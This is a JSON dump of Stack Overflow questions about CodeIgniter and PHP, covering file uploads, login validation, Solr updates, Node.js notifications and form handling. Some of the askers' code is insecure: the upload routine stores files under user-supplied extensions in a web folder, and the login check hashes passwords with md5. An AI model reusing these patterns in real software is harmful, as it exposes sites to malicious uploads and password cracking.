</p>\n\n<p>The problem I am facing with the following code is it is just uploading only one (the one that is selected at last in the form) image. </p>\n\n<p>Could you please kindly tell me where I am doing wrong?</p>\n\n<p>My Controller:</p>\n\n<pre><code>function img_upload(){\n\n   $this-&gt;load-&gt;library('image_upload');         \n\n    $image1= $this-&gt;image_upload-&gt;upload_image('imagefile1');\n    $image2= $this-&gt;image_upload-&gt;upload_image('imagefile2');\n    $image3= $this-&gt;image_upload-&gt;upload_image('imagefile3');\n\n   echo $image1 .\"&lt;br&gt;\"; echo $image2;  \n}\n</code></pre>\n\n<p>application/libraries/image_upload.php (Custom made library)</p>\n\n<pre><code>  function upload_image($image_info){\n\n    $image=$_FILES[$image_info]['name'];\n    $filename = stripslashes($image);\n    $extension = $this-&gt;getExtension($filename);\n    $extension = strtolower($extension);\n\n    $image_name=time().'.'.$extension;\n\n   $newname=\"support/images/products/\".$image_name;\n   $uploaded = move_uploaded_file($_FILES[$image_info]['tmp_name'], $newname);\n\n   if($uploaded) {return $image_name; } else {return FALSE;}\n} \n</code></pre>\n\n<p>My Form</p>\n\n<pre><code> &lt;form id=\"myForm\" enctype=\"multipart/form-data\" \n action=\"&lt;?php echo base_url();?&gt;add/img_upload\" method=\"post\" name=\"myForm\"&gt;\n\n  &lt;input type=\"file\" name=\"imagefile1\" size=\"20\" /&gt;&lt;br&gt;\n  &lt;input type=\"file\" name=\"imagefile2\" size=\"20\" /&gt;&lt;br&gt;\n  &lt;input type=\"file\" name=\"imagefile3\" size=\"20\" /&gt;&lt;br&gt;\n   &lt;br /&gt;&lt;br /&gt;\n  &lt;input type=\"submit\" value=\"upload\" /&gt;    \n &lt;/form&gt;  \n</code></pre>\n"},{"tags":["mysql","codeigniter","node.js","notifications","socket.io"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":12867731,"title":"Creating a Node.js event listener for when there is a new mysql record inserted into table (For Notification Feed)","body":"<p>I am writing a PHP web application in Codeigniter that needs to have real time functionality. Specifically, the two real time features I am developing are real time chatting, and a real time notifications feed. </p>\n\n<p>I was able to use Node.JS and Socket.io to create a real time chat for the site(client to client), but I am struggling immensely on how to go about creating a notification system powered by node (database to client).  </p>\n\n<p><strong>Main Questions:</strong></p>\n\n<ol>\n<li><p>Is there a way to basically have a node event listen to when new records are inserted into a MySQL database?</p></li>\n<li><p>Can Node.js perform long polling to check if the database has new records? If so, would doing long polling with Node.js be more efficient than more traditional polling methods? </p></li>\n</ol>\n\n<p>Thank you so much in advance. Any examples would be highly appreciated! </p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12870219,"title":"PHP reading a txt data file and passing data to array","body":"<p>I need to extract the following data from a txt file(displayed in link),then save every field specified on mysql, my problem is how do I get every field  contained in a row since its separated by spaces </p>\n\n<p>I tried,\n   <code>array = explode(' ', $line);</code>  but that method saves spaces    </p>\n\n<p>I would like to pu it into an array ,</p>\n\n<pre><code>Array=(\n [0] =&gt; '1',\n [ 1] =&gt; 'OC1',\n [2] =&gt; 'Columna', \n [3] =&gt; '1',\n [4] =&gt; 'IN45X104',\n [5] =&gt; '11745'\n ....\n );  \n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/GT0AZ.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["codeigniter","mongodb","mongolab"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12867566,"title":"Using mongolab on a shared hosting site","body":"<p>We are looking at mongolab (http://mongolab.com) to host our data (originally stored in MySQL).  We are currently using a shared hosting plan so we don't have the ability to install applications, so I'm not sure if we can use mongo at the current time.  They have a rest API but I can't tell from the documentation if we can use them without the mongo binary.</p>\n\n<p>The very first action in their tutorial is to run this command:</p>\n\n<p>$ bin/mongo dbh23.mongolab.com:27237/my_new_db -u  -p </p>\n\n<p>So my question is, is it possible to use mongolab from a shared hosting plan? (Using CodeIgniter)</p>\n\n<p>I'm sorry if this is a basic question, however I've only ever used SQL based databases ever.</p>\n"},{"tags":["php","jquery","codeigniter","redirect","jquery-mobile"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":109,"score":2,"question_id":12864013,"title":"Codeigniter redirect does not update url using jQuery mobile","body":"<p>I have a login controller, which is suppose to redirect to my index page when the user is valid. The redirect works, but at the index page the url is still that of the validation method ex: login/validate_login/. If i click on a link on the index page, and then try and go back in the brower history, the browser points me to the validate method and not the index page.</p>\n\n<p>How do i fix this?</p>\n\n<p>I have tried using redirect with both refresh and location, but both with no luck.</p>\n\n<p>I suspect this is a problem with the ajax call of jQuery mobile, but i'm not sure.</p>\n\n<p>Any help appreciated. \nKind regards</p>\n\n<p>NOTE: I would post an image of the url at the index page, but i'm not allowed to because i'm a new user.</p>\n\n<p>My validate method:</p>\n\n<pre><code>    function validate_login($controller='',$method='') {\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;model('workout_model');\n\n    $this-&gt;form_validation-&gt;set_rules('ex_password','Koden','trim|required|min_length[4]|max_length[4]|callback_pw_check');\n\n\n    if($this-&gt;form_validation-&gt;run() == FALSE) {\n        $this-&gt;index();\n    } else {\n        if($query = $this-&gt;workout_model-&gt;validate()) {\n\n            $data = array(\n            'is_logged_in' =&gt; true,\n            'user_id' =&gt; $query-&gt;id,\n            'current_exercise' =&gt; '1'\n            );\n\n            $this-&gt;session-&gt;set_userdata($data);\n\n            if($controller=='' || $method=='') {\n                redirect(\"workout\");\n            } else {\n                redirect($controller.\"/\".$method);\n            }\n        } else {\n            $this-&gt;index();\n        }\n    }\n}\n</code></pre>\n"},{"tags":["php","database","codeigniter","record"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12869616,"title":"codeigniter database error occurred when updating record","body":"<p>i have an error </p>\n\n<pre><code>Error Number: 1054\n\nUnknown column 'Nama_Material_Jasa' in 'field list'\n\nUPDATE `ms_material_jasa` SET `Kode_Kategori_Material_Jasa` = 'KKMJ004', `Nama_Material_Jasa` = 'batuasdf' WHERE `Kode_Kategori_Material_Jasa` = 'KKMJ004'\n\nFilename: C:\\wamp\\www\\QBA\\system\\database\\DB_driver.php\n\nLine Number: 330\n</code></pre>\n\n<p>and this is my update model</p>\n\n<pre><code>function update($getid,$getnama)\n{\n    $data = array('Kode_Kategori_Material_Jasa' =&gt; $getid,'Nama_Material_Jasa' =&gt; $getnama);\n    $this-&gt;db-&gt;where('Kode_Kategori_Material_Jasa', $getid);\n    $this-&gt;db-&gt;update('ms_material_jasa', $data); \n}\n</code></pre>\n\n<p>and here is my controller </p>\n\n<pre><code> function ubah()\n{\n    $getid = $this-&gt;input-&gt;post('kkmj');\n    $getnama = $this-&gt;input-&gt;post('nmj');\n    $data['pesan'] = $getid.' berhasil diubah ! ';\n    $data['title'] = 'QB Ubah Kategori Material';\n\n    $this-&gt;m_kategorimaterial-&gt;update($getid,$getnama);\n    //echo $getid.$getnama; //it returns KKMJ005newVal , like i want\n\n    $this-&gt;load-&gt;view('head',$data);\n    $this-&gt;load-&gt;view('v/vkategorimaterial',$data);\n\n}\n</code></pre>\n\n<p>when i echo <code>$getid</code> and <code>$getnama</code> variable, it returns <code>KKMJ005Newval</code> so no problem on controller, i believe it has something to do with the models, </p>\n\n<p>how do i resolve this ?</p>\n\n<p>the table name is <code>ms_kategori_material</code> and it has 2 field, <code>Kode_Kategori_Material_Jasa</code> and <code>Nama_Material_Jasa</code></p>\n"},{"tags":["php","codeigniter","solr"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12817192,"title":"solr data can not be sent before solrcommit","body":"<p>What my problem is that I can not send array to solr machine in order to update. I am using codeigniter as a framework and here is my code:</p>\n\n<pre><code>            $solrData = array();\n\n            $solrData['id']                 = $this-&gt;data['profil_data']['id'];\n            $solrData['site']               = $this-&gt;data['profil_data']['site'];\n            $solrData['url_Domain']         = $this-&gt;data['profil_data']['url_Domain'];\n            $solrData['url_Page']           = $this-&gt;data['profil_data']['url_Page'];\n            $solrData['url_Profil']         = $this-&gt;data['profil_data']['url_Profil'];\n            $solrData['scr_Kobi_Rank']      = $this-&gt;data['profil_data']['scr_Kobi_Rank'];\n            $solrData['scr_A']              = $this-&gt;data['profil_data']['scr_A'];\n            $solrData['scr_B']              = $this-&gt;data['profil_data']['scr_B'];\n            $solrData['scr_C']              = $this-&gt;data['profil_data']['scr_C'];\n            $solrData['scr_D']              = $this-&gt;data['profil_data']['scr_D'];\n            $solrData['loc_City']           = $this-&gt;input-&gt;post('plakano');\n            $solrData['loc_Lat_Lon']        = $this-&gt;input-&gt;post('loc_Lat_Lon');\n            $solrData['com_Category']       = explode(',', $this-&gt;input-&gt;post('category'));         \n\n            $urunData   = $this-&gt;input-&gt;post('urun_list');\n\n            foreach($urunData as $row)\n            {\n                $ontoData = $this-&gt;m_onto-&gt;getOntoDataByOntoDataId($row);\n                $solrData['com_Products'][] = $ontoData['baslik'];\n            }\n\n            $hizmetData = $this-&gt;input-&gt;post('hizmet_list');\n\n            foreach($hizmetData as $row)\n            {\n                $ontoData = $this-&gt;m_onto-&gt;getOntoDataByOntoDataId($row);\n                $solrData['com_Services'][] = $ontoData['baslik'];\n            }\n\n            $solrData['com_Type']           = $this-&gt;input-&gt;post('sirketturu');\n            $solrData['com_Description']    = $this-&gt;input-&gt;post('description');\n            $solrData['com_Title_Selected'] = $this-&gt;input-&gt;post('title');\n            $solrData['com_Title_Long']     = $this-&gt;data['profil_data']['com_Title_Long'];\n            $solrData['crm_Tel']            = $this-&gt;input-&gt;post('tel');\n            $solrData['crm_Fax']            = $this-&gt;input-&gt;post('fax');\n            $solrData['crm_Email']          = $this-&gt;input-&gt;post('email');\n\n            $this-&gt;solr-&gt;updateSolrProfilData($solrData);\n</code></pre>\n\n<p>And solr process:</p>\n\n<pre><code>public function updateSolrProfilData($arrData)\n{\n    if(count($arrData) == 0)\n        return FALSE;\n\n    $solrClientOptions          = $this-&gt;solrClientOptionsYazProfil;    \n    $solrClientOptionsCommit    = $this-&gt;solrClientOptionsYazProfilCommit;\n\n    $solrClient = new SolrClient($solrClientOptions);       \n    $solrDoc    = new SolrInputDocument();\n\n    foreach($arrData as $firmaField =&gt; $firmaValue)\n    {\n        if(! is_array($firmaValue))\n        {\n            $solrDoc-&gt;addField($firmaField, $firmaValue);\n        }\n        else\n        {\n            foreach($firmaValue as $firmaField2 =&gt; $firmaValue2)\n            {\n                if($firmaValue2 != '')\n                {\n                    $solrDoc-&gt;addField($firmaField, $firmaValue2);\n                }\n            }\n        }\n    }\n\n    try {\n        $this-&gt;_solrCommit($solrClientOptionsCommit);\n    } catch (Exception $e) {\n        echo $e-&gt;getMessage(); \n    }           \n}\n</code></pre>\n\n<p>Solr Commit function:</p>\n\n<pre><code>private function _solrCommit($solrArr)\n{\n    $urlCommit  = 'http://' . $solrArr['hostname'] . \":\" . $solrArr['port'] . '/' . $solrArr['path'] . \"/update?stream.body=%3Ccommit/%3E&amp;wt=json\";\n\n    $output     = file_get_contents($urlCommit);\n    $outputArr  = json_decode($output, TRUE);\n\n    if ($outputArr['responseHeader']['status'] ===  0)\n        return TRUE;\n    else\n        return FALSE;\n}\n</code></pre>\n\n<p>And that is the options:</p>\n\n<pre><code>private $solrClientOptionsYazProfilCommit = array(\n                                'hostname' =&gt; SOLR_HOST_YAZ,\n                                'login'    =&gt; '',\n                                'password' =&gt; '',\n                                'port'     =&gt; SOLR_PORT,\n                                'path'     =&gt; 'solr/collection1'\n);\n</code></pre>\n\n<p>Altough try-catch returns no error, the data can not be updated. Moreover, code sends solr commit succesfully. I checked the url but it is in correct form. What is wrong in here?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":118,"score":-1,"question_id":10577771,"title":"How to upload a vcard(.vcf) file using codeigniter","body":"<p>I tried to upload a vcard file using codeigniter. But It's not allowed to upload. How to upload a vcard(.vcf) file using codeigniter?</p>\n"},{"tags":["codeigniter","helper"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12868684,"title":"Is there any reason to use an helper to produce static HTML code?","body":"<p>I'm working on a project using CodeIgniter. Surely, it's very useful to have an helper like <code>language</code> as the string you're going to print can change depending on the language you loaded. So, instead of writing pure php code, you can use the helper.</p>\n\n<p>However, it's not clear to me which is the sense of helper function like:</p>\n\n<p><code>echo doctype();</code></p>\n\n<p>that expands to:</p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n</code></pre>\n\n<p>Of course, the first one it's easier to write, but that code has to be processed every time. You save few seconds of coding at the cost of infinite executions of the same code that has always the same output on each page (and there are many helper like that one, for example the <code>Form Helper</code> is plenty of valid examples where the functions produce static HTML code).</p>\n\n<p>So, the question is: why should I use an helper if I don't have any dynamic code/variable to add?</p>\n"},{"tags":["php","codeigniter","postgresql","spark","phpactiverecord"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":387,"score":0,"question_id":7661517,"title":"CodeIgniter2 + Sparks + Php-ActiveRecord troubles with PostgreSql","body":"<p>I'm using CodeIgniter2 + Sparks + PhpActiveRecord, I installed following this tutorial : <a href=\"http://heybigname.com/2011/07/28/codeigniter-2-sparks-php-activerecord-part-1-installation/\" rel=\"nofollow\">http://heybigname.com/2011/07/28/codeigniter-2-sparks-php-activerecord-part-1-installation/</a></p>\n\n<p>with MySql works perfectly, but with PostgreSql doesn't works.</p>\n\n<p>I get the next error:</p>\n\n<pre><code>Fatal error: Uncaught exception 'ActiveRecord\\DatabaseException' with message 'ActiveRecord\\PostgreAdapter not found!' in C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\Connection.php:127 Stack trace: #0 C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\Connection.php(98): ActiveRecord\\Connection::load_adapter_class('postgre') #1 C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\ConnectionManager.php(33): ActiveRecord\\Connection::instance('postgre://postg...') #2 C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\Table.php(103): ActiveRecord\\ConnectionManager::get_connection(NULL) #3 C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\Table.php(80): ActiveRecord\\Table-&gt;reestablish_connection(false) #4 C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\Table.php(61): ActiveRecord\\Table-&gt;__construct('User') #5 C:\\xampp\\htdocs\\part1\\sparks\\php-activ in C:\\xampp\\htdocs\\part1\\sparks\\php-activerecord\\0.0.1\\vendor\\php-activerecord\\lib\\Connection.php on line 127\n</code></pre>\n\n<p>where \"Postgre\" adapter is search in Php-ActiveRecord folder, but here is called \"Pgsql\", and when configure in CodeIgniter, must be use \"Postgre\". </p>\n\n<p>How can pass the real driver, for Php-Activerecord, works?</p>\n\n<p>grettings.</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12866771,"title":"Codeigniter template class: check if pseudo variables have a value","body":"<p>Not sure if it's possible, but can you use if statements inside a template?</p>\n\n<p>So if a phone number does not have a value I don't want to display that sentence at all...</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang='en'&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"utf-8\"/&gt;\n    &lt;title&gt;{form_title}&lt;/title&gt;\n\n&lt;/head&gt;\n\n\n&lt;body&gt;\n    &lt;p&gt;You received the following message from {name} through the Gossip Cakes' contact form.&lt;/p&gt;\n\n    &lt;p&gt;Their email is {email}&lt;/p&gt;\n\n    &lt;p&gt;Their phone number is {phone}&lt;/p&gt;\n\n    &lt;p&gt;The message: {message}&lt;/p&gt;\n\n&lt;/body&gt;\n\n\n&lt;/html&gt;\n</code></pre>\n\n<p>I guess I could use straight php, but is there a method of returning the html of a view?</p>\n"},{"tags":["codeigniter","object","passing"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12865274,"title":"CodeIgniter Passing Arrays instead of Objects","body":"<p><strong>Framework</strong> :  CI</p>\n\n<p><strong>Situation:</strong></p>\n\n<p>I have this very frustrating problem in codeigniter.</p>\n\n<p>here is the code:\n(Controller)</p>\n\n<pre><code>class sampleController extends CI_Controller {\n\nfunction index() {\n    data['message'] = 'something';\n\n    data['js'] = array('script1.js', 'script2.js');\n    data['css'] = array('style1.css', 'style2.css', 'style3.css');\n\n    $this-&gt;load-&gt;model('user_model');\n    $user = $this-&gt;input-&gt;post('username');\n\n    data['user_id'] = $this-&gt;user_model-&gt;getUserIdByUsername($user);\n    data['user_info'] = $this-&gt;user_model-&gt;getAllUserInfo($user);\n\n    $this-&gt;load-&gt;view('someview', $data);\n\n}\n\n}\n</code></pre>\n\n<p>okay there goes my controller, i passed several data like <code>js</code>, <code>css</code>, <code>user_id</code> and <code>user_info</code></p>\n\n<p>here are the methods in my model:</p>\n\n<pre><code>getUserIdByUsername($user) {\n$this-&gt;db-&gt;select(\"id\");\n$this-&gt;db-&gt;where(\"username\", $user);\n$result = $this-&gt;get(\"users\");\nreturn $result-&gt;row();\n\n}\n\ngetAllUserInfo($user) {\n$this-&gt;db-&gt;select(\"first_name, last_name, age\");\n$this-&gt;db-&gt;where(\"username\", $user);\n$result = $this-&gt;get(\"users\");\nreturn $result-&gt;row();\n}\n</code></pre>\n\n<p>The problem occurs in the view, when i tried to access all the variables that has been passed by the controller</p>\n\n<ol>\n<li>if i tried echoing <code>$message</code>, it will render out correctly like this = <code>something</code></li>\n<li><p>if i tried looping on each using foreach<code>$js</code> and <code>$css</code> like this</p>\n\n<p><code>foreach($js as $key){//echo script here}</code></p>\n\n<p><code>foreach($css as $key){// echo link rel stylesheet here}</code></p></li>\n</ol>\n\n<p>it will render out correctly like <code>&lt;script src='script1.js'&gt;&lt;/script&gt;&lt;script ...&gt;&lt;/script&gt;</code> iterate to all <code>$js</code> same goes with <code>css</code></p>\n\n<p>but if i tried echoing out $user_id . .  it won't, bec. it is an object. </p>\n\n<p>so to solve for the problem what i did is . .<code>&lt;?php foreach($user_id as $id){} ?&gt;</code> i can echo $id in this case\nis there anyway so that i can echo it out simple without that messy foreach.</p>\n\n<p>i understandd that when i comes to <code>$user_info</code>, it is fine to do this <code>foreach($user_info as $key =&gt; $value){$info[$key]=$value}</code>\nbut is there a better way that doing that in the view?</p>\n\n<p>maybe instead of an object, array will be sent before the view can use it?</p>\n\n<p>thanks muchs </p>\n\n<p>Edit: fixed same method name;</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12845308,"title":"codeigniter update database with \"TRUE\" for checked items and \"FALSE\" for remaining unchecked items","body":"<p>I am new to php/codeignitor and trying to post changes on form checkboxes to my db. The row to modify is assigned by the gl_id below. \nI am not sure how to use my update_checked function in the model to\npost TRUE to each of these fields where gl_id =x and FALSE using to the remaining fields not in the array. I can create and view the array of checked values using $_POST['checked'] in the controller\nand passing it to the model. Now I need to use this array to post to the db where gl_id = the value from the form in the view.</p>\n\n<p>In View</p>\n\n<pre><code>    &lt;h1&gt;Update GL id &lt;?php echo $gl_field['gl_id'];?&gt;&lt;/h1&gt;\n        &lt;label&gt;Stat&lt;/label&gt;\n            &lt;input type=\"checkbox\" &lt;?php if ($gl_field['stat'] == \"TRUE\") {echo \"checked = checked\";} ?&gt;   \n            name = \"checked[]\" id=\"stat\" value= \"stat\"  /&gt;&lt;BR CLEAR=\"all\"&gt;\n        &lt;label&gt;Exclude&lt;/label&gt;\n            &lt;input type=\"checkbox\" &lt;?php if ($gl_field['exclude'] == \"TRUE\") {echo \"checked = checked\";} ?&gt;  \n            name=\"checked[]\" id=\"exclude\" value= \"exclude\"&gt;&lt;BR CLEAR=\"all\"&gt;\n        &lt;label&gt;Override&lt;/label&gt;\n            &lt;input type=\"checkbox\" &lt;?php if ($gl_field['override'] == \"TRUE\") {echo \"checked = checked\";} ?&gt;          \n            name= \"checked[]\" id= \"override\" value = \"override\"/&gt;&lt;BR CLEAR=\"all\"&gt;\n</code></pre>\n\n<p>In Controller</p>\n\n<pre><code>            public function update_table(){\n               $this-&gt;load-&gt;helper('form');\n               $this-&gt;page_nav_model-&gt;update_table();\n               $checked_array = $_POST['checked'];\n               $this-&gt;page_nav_model-&gt;update_checked($checked_array);\n               $this-&gt;load-&gt;view('pages/success');\n            }\n</code></pre>\n\n<p>In Model</p>\n\n<pre><code>    foreach($checked_array as $true){\n            echo $true;                             \n        }\n</code></pre>\n\n<p>To clarify when I pull the information into the form in the example above all of the checkboxes are set to \"TRUE\" in the db so they are checked. If I uncheck stat and click submit I am able to see an array with the values (exclude, override).</p>\n\n<p>I appreciate any help that sets me in the right direction. </p>\n"},{"tags":["php","mysql","database","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":102,"score":3,"question_id":12847242,"title":"Fatal error: Call to a member function where() on a non-object codeigniter $query->num_rows()==1)","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8322124/codeigniter-call-to-a-member-function-select-on-a-non-object\">CodeIgniter - Call to a member function select() on a non-object</a>  </p>\n</blockquote>\n\n\n\n<p>I'm newbie with codeigniter and have some problems.</p>\n\n<p><strong>Error Message:</strong> **Fatal error: Call to a member function where() on a non-object in C:\\xampp\\htdocs\\moi\\CI\\application\\models\\model_users.php on line 12**</p>\n\n<p>My Model: </p>\n\n<pre><code>class Model_users extends CI_Model {\n\n function __construct(){\n    parent::__construct();\n}\n\npublic function can_log_in() {\n\n\n    $this-&gt;db-&gt;where('email', $this-&gt;input-&gt;post('email'));\n    $this-&gt;db-&gt;where('pass', md5($this-&gt;input-&gt;post('password')));\n    $query = $this-&gt;db-&gt;get('users');\n\n    if ($query-&gt;num_rows()==1) {\n        return TRUE;\n    } else {\n        return FALSE;\n    }\n</code></pre>\n\n<p>My Controller: </p>\n\n<pre><code>class Main extends CI_Controller {\n\npublic function index() {\n    $this-&gt;login();\n}\n\n//Auslagern der Funktionen\npublic function login() {\n    $this-&gt;load-&gt;view('login');\n}\n\npublic function login_validation() {\n\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;form_validation-&gt;set_rules('email', 'email', 'required|valid_email|xss_clean|callback_username_check');\n    $this-&gt;form_validation-&gt;set_rules('password', 'password', 'required|md5');\n\n    if ($this-&gt;form_validation-&gt;run()) {\n        redirect('main/members');\n    } else {\n        $this-&gt;load-&gt;view('login');\n    }\n}\n\npublic function username_check() {\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;model('model_users');\n    if ($this-&gt;model_users-&gt;can_log_in()) {\n        return TRUE;\n    } else {\n        $this-&gt;form_validation-&gt;set_message('username_check', 'incorect User or Passwort.');\n        return FALSE;\n    }\n}\n\n}\n</code></pre>\n\n<p>please for help</p>\n"},{"tags":["javascript","jquery","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12865107,"title":"Codeigniter 2.1, jquery - ajax(post) disallowed key characters","body":"<p>Jquery function (it is working):</p>\n\n<pre><code>del_selected.on('click', function(e){\n\n    box.filter(':checked').each(function(){\n        selektovane_slike.push($(this).val());\n        $(this).parent().slideUp('fast');\n    });\n    data = JSON.stringify(box.serialize(), null, 2);\n    console.log(data);\n    $.post(del_url, data, function(){\n\n    }, JSON);\n    e.preventDefault();\n});\n</code></pre>\n\n<p>This function gives this result: </p>\n\n<blockquote>\n  <p>\"slike=apples.jpg&amp;slike=50BestBandLogos.jpg&amp;slike=Great-Logos-200x200.jpg\"</p>\n</blockquote>\n\n<p>And in PHP we have this:</p>\n\n<pre><code>function ypg_delete_img_selected()\n{\n    print_r($_POST);\n}\n</code></pre>\n\n<p>Response which I get is:</p>\n\n<p><strong>Disallowed Key Characters.</strong></p>\n\n<p>What is the problem?</p>\n\n<p>HTML:</p>\n\n<pre><code>&lt;div class=\"zuta_strana_trenutne_slike\"&gt;\n                            &lt;p&gt;All Images&lt;/p&gt;\n                            &lt;?php $imgs = explode(',', $zts['image']);\n                                foreach($imgs as $img) : ?&gt;\n                            &lt;div class=\"zuta_strana_izmena_slika\"&gt;\n                                &lt;img src=\"&lt;?php echo IMG ?&gt;zute_strane/thumbs/&lt;?php echo $img ?&gt;\" title=\"&lt;?php echo $zts['name'] ?&gt;\" /&gt;\n                                &lt;input type=\"checkbox\" name=\"slike\" value=\"&lt;?php echo $img  ?&gt;\" /&gt;\n                                &lt;a href=\"&lt;?php echo base_url() ?&gt;zute_strane/ypg_delete_img/&lt;?php echo $img . '/' . $zts['id_global_info'] ?&gt;\" title=\"&lt;?php echo $img ?&gt;\"&gt;Obriši Sliku&lt;/a&gt;\n                            &lt;/div&gt;\n                            &lt;?php endforeach; ?&gt;\n                            &lt;a class=\"zute_strane_izmena_selektuj_sve\"&gt;Select All&lt;/a&gt;\n                            &lt;a href=\"&lt;?php echo base_url() ?&gt;zute_strane/ypg_delete_img_selected/&lt;?php echo $zts['id_global_info'] ?&gt;\" class=\"zute_strane_izmena_obrisi_sve\"&gt;Delete Selected&lt;/a&gt;\n                        &lt;/div&gt;\n</code></pre>\n"},{"tags":["codeigniter","hmvc","modular"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":631,"score":0,"question_id":8399254,"title":"CodeIgniter 2.0 with Modular Extensions (HMVC) not showing anything in Linux","body":"<p>*edited to be more clearly</p>\n\n<p>I'm deploying CI 2.0.3 with Modular Extensions (HMVC) in two environments, one is Windows -for development- and the other is Linux -for production-. Both environment has identically folders and files structure. Currently I am having a problem.</p>\n\n<p>After integrating the Modular Extensions to CI by following the manual. The first thing I did was moving the default Welcome MVC that comes with CI to Modular Extensions HMVC. Both environment successfully moved and can be viewed on the browser.</p>\n\n<p>But when I create other modules, it worked on Windows environment but not on Linux. On Windows when I call the module the browser shows the page as expected. But on Linux it shows just white blank page. Not even an 404 err page, which means it is not a broken link.</p>\n\n<p>Can anyone tells me what is wrong in the CI?</p>\n\n<p>Directory structure</p>\n\n<pre><code>/application\n-/cache\n-/config\n-/controllers\n-/core\n--MY_Loader.php\n--MY_Router.php\n-/errors\n-/helpers\n-/hooks\n-/language\n--/english\n-/libraries\n-/logs\n-/models\n-/modules\n--/csv_game_credit\n---/controllers\n----csv_game_credit.php\n---/models\n----csv_game_credit_db.php\n---/views\n----welcome_message.php\n--/welcome\n---/controllers\n----welcome.php\n---/views\n----welcome_message.php\n-/third_party\n--/MX\n--Base.php\n--Ci.php\n--Config.php\n--Controller.php\n--Lang.php\n--Loader.php\n--Modules.php\n--Router.php\n-/views\n</code></pre>\n\n<p>Welcome controller</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Welcome extends CI_Controller {\n\n    public function index()\n    {\n        $this-&gt;load-&gt;view('welcome_message');\n    }\n}\n</code></pre>\n\n<p>Csv_game_credit controller</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Csv_game_credit extends CI_Controller {\n\n    function __construct() {\n        parent::__construct();\n        $this-&gt;load-&gt;model('Csv_game_credit_db');\n\n        $this-&gt;load-&gt;dbutil();\n        $this-&gt;load-&gt;helper('file');\n    }\n\n    public function index()\n    {\n        $this-&gt;load-&gt;view('welcome_message');\n    }\n\n}\n</code></pre>\n\n<p>Is this has something to do with the Linux's folder permission? I will try to change the folder permission to 777 and update you guys</p>\n\n<p>Thanks before</p>\n"},{"tags":["php","codeigniter","csv"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12865121,"title":"Best way to \"carry\" large data through a multistep form using Codeigniter.","body":"<p>Here is the process of my form:</p>\n\n<p>Step 1: User uploads a CSV. System parses it and accepts some records, denies some others.</p>\n\n<p>Step 2: User can see how many were accepted and how many were not as a confirmation. User has a choice of processing with only successful records from CSV or cancel the process all together (via a cancel button or just going back to home page). </p>\n\n<p>Now, what is the best way for me to \"hold\" this CSV data into step 2 and beyond (if they want to keep going)? I am thinking about storing all records into the database from step 1, but that will cause a lot of unnecessary DB activity and possibly making the database too large with left over records.  I am also thinking about leaving the file on the server to be picked up again with only the successful records if they choose to proceed on step 2, but then I'd have to clean up a bunch of all files all the time (ex. if they just close the browser at step 2). Thirdly, storing in a session would make the session too large. </p>\n\n<p>Thanks in advance! </p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12485719,"title":"Constructor session validation for different functions","body":"<p>I'm doing a validation in my constructor which checks whether the user has started a session. </p>\n\n<p>I'm then throwing in some controllers for various things.</p>\n\n<p>My question is - can I have some of the controllers unaffected by the construct function(session validation), or do i have to take it into another file? The reason is, that I would like to have two sets of function in the constructor - one for when the user is logged in, and the rest when they are not.</p>\n\n<p>I used to have two files and switch between them, but then i decided to combine them into 